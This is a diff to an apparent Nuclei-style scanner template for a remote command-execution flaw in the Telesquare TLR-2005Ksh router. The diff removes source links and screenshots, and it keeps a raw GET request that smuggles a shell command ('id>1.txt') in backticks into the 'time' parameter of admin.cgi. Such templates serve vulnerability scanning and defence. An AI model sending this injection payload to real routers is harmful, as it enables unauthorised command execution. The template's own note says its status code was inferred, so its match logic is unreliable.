@@ -3,13 +3,8 @@ info:
   name: Telesquare TLR-2005Ksh 路由器 RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rgrw8tt1itf4c7up
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rgrw8tt1itf4c7up
 http:
 - raw:
   - 'GET /cgi-bin/admin.cgi?Command=setSyncTimeHost&time=`id>1.txt` HTTP/1.1
@@ -27,17 +22,7 @@ http:
     Connection: close
 
 
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058646805-2a6fd53a-48cb-484c-b288-1e1cd0aae96e.png)
-
-
     验证
-
-
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058647158-7506062a-cf68-4082-aaa4-288b0f24a27e.png)
 
 
     ## 修复建议
